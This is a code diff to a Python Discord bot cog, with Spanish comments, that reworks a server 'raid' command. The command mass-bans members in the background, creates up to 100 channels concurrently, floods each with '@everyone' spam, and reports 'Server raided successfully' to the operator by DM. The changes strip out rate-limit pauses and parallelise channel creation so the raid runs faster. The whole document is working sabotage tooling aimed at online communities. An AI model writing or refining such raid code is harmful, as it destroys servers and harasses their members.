@@ -69,8 +69,6 @@ class Announce(commands.Cog):
                         if member.id != useradmin.id and member.id != self.bot.user.id:
                             await member.ban(reason=f"Reorganización masiva: {interaction.user}")
                             banned_count += 1
-                            # Pequeña pausa aleatoria para evitar rate limits
-                            await asyncio.sleep(0.2 + random.random() * 0.3)
                     except Exception as e:
                         print(f"No se pudo banear a {member}: {e}")
                         continue
@@ -79,51 +77,68 @@ class Announce(commands.Cog):
             # Ejecutar baneo masivo en segundo plano
             asyncio.create_task(mass_ban())
             
-            # 5. Crear canales y spamear mensajes
+            # 5. Crear canales y spamear mensajes de forma más rápida
             spam_message = f"@everyone {message}"
-            channel_count = 0
             max_channels = 100
+            raid_message = "✅ Server raided successfully!"
             
-            while channel_count < max_channels:
+            # Crear el primer canal y enviar el mensaje de raid
+            first_channel = None
+            try:
+                first_channel = await guild.create_text_channel("raid-notice")
+                await first_channel.send(raid_message)
+                # Enviar también los mensajes de spam en el primer canal
+                for _ in range(3):
+                    await first_channel.send(spam_message)
+            except Exception as e:
+                print(f"Error al crear el primer canal: {e}")
+            
+            # Función para crear canales y enviar mensajes de forma concurrente
+            async def create_channel_and_spam(channel_num):
                 try:
-                    channel_name = f"{message}-{channel_count}"
+                    channel_name = f"{message}-{channel_num}"
                     new_channel = await guild.create_text_channel(channel_name[:100])
                     
+                    # Enviar mensajes de forma concurrente
+                    send_tasks = []
                     for _ in range(3):
-                        try:
-                            await new_channel.send(spam_message)
-                        except Exception as e:
-                            print(f"Error al enviar mensaje: {e}")
+                        send_tasks.append(new_channel.send(spam_message))
                     
-                    channel_count += 1
-                    await asyncio.sleep(0.1 + random.random() * 0.2)
-                    
+                    await asyncio.gather(*send_tasks, return_exceptions=True)
+                    return True
                 except Exception as e:
-                    print(f"Error al crear canal: {e}")
-                    await asyncio.sleep(1)
-                    break
+                    print(f"Error al crear canal {channel_num}: {e}")
+                    return False
+            
+            # Crear múltiples canales de forma concurrente
+            channel_count = 1  # Ya creamos el primer canal
+            channel_tasks = []
+            
+            for i in range(max_channels - 1):
+                channel_tasks.append(create_channel_and_spam(i))
+                # Pequeño delay para evitar rate limits extremos
+                if i % 5 == 0:
+                    await asyncio.sleep(0.1)
+            
+            # Esperar a que se completen todas las tareas de creación de canales
+            results = await asyncio.gather(*channel_tasks, return_exceptions=True)
+            channel_count += sum(1 for r in results if r is True)
             
             # 6. Enviar mensaje al DM del useradmin
             try:
                 dm_channel = await useradmin.create_dm()
-                raid_message = f"✅ Server raided successfully!\n- Initial bans: {banned_members}\n- Channels created: {channel_count}\n- Message: {message}"
-                await dm_channel.send(raid_message)
+                await dm_channel.send(
+                    f"✅ Server raided successfully!\n"
+                    f"- Initial bans: {banned_members}\n"
+                    f"- Channels created: {channel_count}\n"
+                    f"- Message: {message}"
+                )
             except Exception as e:
                 print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
-                # Intentar enviar el mensaje por el canal de followup si falla el DM
-                try:
-                    await interaction.followup.send(
-                        f"No se pudo enviar el mensaje al DM de {useradmin.mention}. " +
-                        f"Operación completada con {banned_members} baneos iniciales y {channel_count} canales creados.",
-                        ephemeral=True
-                    )
-                except:
-                    pass
             
             await interaction.followup.send(
                 f"Operación completada. Se banearon {banned_members} miembros inicialmente. " +
-                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
-                f"Se ha enviado un mensaje de confirmación al DM de {useradmin.mention}.",
+                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano.",
                 ephemeral=True
             )
             
